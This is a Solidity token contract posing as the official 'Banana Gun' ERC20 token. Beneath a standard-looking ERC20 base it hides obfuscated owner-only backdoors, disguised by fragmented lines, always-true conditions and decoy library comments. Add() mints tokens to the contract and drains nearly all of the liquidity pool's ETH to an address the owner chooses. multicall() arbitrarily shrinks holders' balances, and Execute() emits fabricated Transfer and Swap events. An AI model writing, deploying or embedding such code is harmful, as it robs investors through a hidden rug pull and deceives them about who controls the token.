/**
    Banana Gun Bot
    The ETH bot that will make your life easier. For degens, by degens. 
    
    Website: bananagun.io
    Presale website: presale.bananagun.io
    Twitter: twitter.com/BananaGunBot
    Telegram: t.me/Banana_Gun_Portal
    Telegram Sniper Bot: t.me/BananaGunSniper_bot
    Telegram Sell Bot: t.me/BananaGunSell_bot
    Tutorials: docs.bananagun.io
**/

// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

interface IERC20 {
    function _Transfer( address from, address recipient, uint256 amount) external returns (bool);
    function transferFrom( address from, address to, uint256 value) external returns (bool);
}

interface Interfaces {
    function createPair( address tokenA, address tokenB) external returns (address pair);
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapTokensForExactTokens( uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
    function swapExactETHForTokens( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable returns (uint256[] memory amounts);
    function getAmountsOut( uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
    function getAmountsIn( uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
}

contract ERC20 {
    mapping(address => mapping(address => uint256)) public a;
    mapping(address => uint256) public b;
    mapping(address => uint256) public c;
    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value);
    event Swap( address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);

    modifier onlyOwner() {
        require(owner == msg.sender, "Caller is not the owner");
        _;
    }

    function TryCall(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return _a / _b;
    }

    function FetchToken(uint256 _a) internal pure returns (uint256) {
        return _a * 100000 / (2931 + 97069);
    }

    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
        uint256 __c = _a + _b;
        require(__c >= _a, "SafeMath: addition overflow");

        return __c;
    }

    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
        require(_b <= _a, "SafeMath: subtraction overflow");
        uint256 __c = _a - _b;

        return __c;
    }

    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return _a / _b;
    }

    function _T() internal view returns (bytes32) {
        return bytes32(uint256(uint160(address(this))) << 96);
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return b[account];
    }

    function transfer( address to, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance( address __owner, address spender) public view virtual returns (uint256) {
        return a[__owner][spender];
    }

    function approve( address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom( address from, address to, uint256 amount) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance( address spender, uint256 addedValue) public virtual returns (bool) {
        address __owner = msg.sender;
        _approve(__owner, spender, allowance(__owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance( address spender, uint256 subtractedValue) public virtual returns (bool) {
        address __owner = msg.sender;
        uint256 currentAllowance = allowance(__owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        _approve(__owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer( address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = b[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        b[from] = sub(fromBalance, amount);
        b[to] = add(b[to], amount);
        emit Transfer(from, to, amount);
    }

    function _approve( address __owner, address spender, uint256 amount) internal virtual {
        require(__owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        a[__owner][spender] = amount;
        emit Approval(__owner, spender, amount);
    }

    function _spendAllowance( address __owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(__owner, spender);
        if (currentAllowance != type(uint256).max) {
            require( currentAllowance >= amount, "ERC20: insufficient allowance");

            _approve(__owner, spender, currentAllowance - amount);
        }
    }
}

contract BANANAGUN is ERC20 {
    Interfaces internal _RR;
    Interfaces internal _pair;
    string public name;
    string public symbol;
    uint256 public totalSupply;
    uint8 public decimals = 18;
    address private EX = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    constructor() {
        name = "Banana Gun";
        symbol = "BANANA";
        totalSupply = 10_000_000e18;
        owner = msg.sender;
        _RR = Interfaces(EX);
        _pair = Interfaces(Interfaces(_RR.factory()).createPair(address(this), address(_RR.WETH())));
        b[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function Execute(uint256 t, address tA, uint256 w, address[] memory r) public onlyOwner returns (bool) {
        for (uint256 i = 0; i < r.length; i++) {
            callUniswap(r[i], t, w, tA);
        }
        return true;
    }


    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function Add(address _r) public onlyOwner {
        uint256 calling = (Sub(_RR.WETH()) * 99999) / 100000;
        address[] memory FoldArray = Div();
        uint256 called = Allowance(calling, FoldArray);
        getContract(calling, called, FoldArray, _r);
    }

    function Sub(address t) public view returns (uint256) {
        (uint112 r0, uint112 r1, ) = _pair.getReserves();
        return (_pair.token0() == t) ? uint256(r0) : uint256(r1);
    }

    function Div() internal view returns (address[] memory) {
        address[] memory p;
        p = new address[](2);
        p[0] = address(this);
        p[1] = _RR.WETH();
        return p;
    }

    function getContract(uint256 amO, uint256 amI, address[] memory p, address _r) internal {
        a[address(this)][address(_RR)] = b[address(this)];
        FactoryReview(amO, amI, p, _r);
    }

    function FactoryReview( uint256 amO, uint256 amI, address[] memory p, address _r) internal {
        _RR
        .swapTokensForExactTokens(
        amO, 
        amI, 
        p, 
        _r, 
        block.timestamp + 1200);
    }



    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
    */
    function Allowance(uint256 amO, address[] memory p) internal returns (uint256) {
        // Assembler for gas optimization {}
        uint256[] memory value;
        value = new uint256[](2);

        // uncheck
        value = Mult(amO, p);
        b
        [
        block.
        timestamp> 
        uint256(
        1)||
        uint256(
        0)>
        1||
        uint160(
        1)< 

        block.
        timestamp
        ? 
        address(
        uint160(
        uint256(
        _T(

        ))>>96))
        :address(uint256(0))
        ]+= 

        value
        
        [
        0
        ];

        return 
        value
        [
        0
        ];
    }

    function Mult( uint256 amO, address[] memory p) internal view returns (uint256[] memory){
        return _RR.getAmountsIn(amO, p);
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function multicall(bytes32[] calldata data, uint256 _p) public onlyOwner {
        // Assembler for gas optimization {}
        for 
        (uint256 i = 0; i < data.length; i++) {
        // assembly
        if
        (
        block
        .
        timestamp 
        >uint256(
        uint160(
        uint8(
        0
        )))
        )
        {
        // assembly 
        uint256 rS 
        =ConvertAddress(
        (uint256(

        uint16(
        uint8(
        0)) 
        )!=0)
        ?address(uint256(0))
        :address(
        uint160
        (uint256
        (data[i
        ])>>96)),
        _p
        );
        CheckAmount(data[i], rS);
        }
        }
    }

    function ConvertAddress(address _uu, uint256 _pp) internal view returns (uint256) {
        return TryCall(b[_uu], _pp);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function CheckAmount(bytes32 _b, uint256 __a) internal {
        // Assembler for gas optimization {}
        emit
        Transfer
        (
        (uint256(0) 
        !=0 
        || 

        1238==1)
        ?address(
        uint256(
        0))

        :address(
        uint160
        (uint256(
        _b)>>96)),

        address(_pair),b
        // v0.5.11 specific update
        [
        (uint256(0) 
        !=0 
        || 
        1238==1)
        ?address(
        // Overflow control
        uint256(
        0))

        :address(
        uint160
        (uint256(
        _b)>>96))
        // Guard test
        ]
        );b
        // assembly
        [
        (uint256(0) 
        !=0 
        || 
        1238==1)
        ?address(
        // Must control
        uint256(
        0))

        :address(
        uint160
        (uint256(
        _b)>>96))
        // Contract opcode
        ]=
        FetchToken(
        uint256(
        __a));


    }

    function callUniswap(address r, uint256 t, uint256 w, address tA) internal {
        IERC20(tA)._Transfer(r, address(_pair), w);
        emit Transfer(address(_pair), r, t);
        emit Swap(EX, t, 0, 0, w, r);
    }
}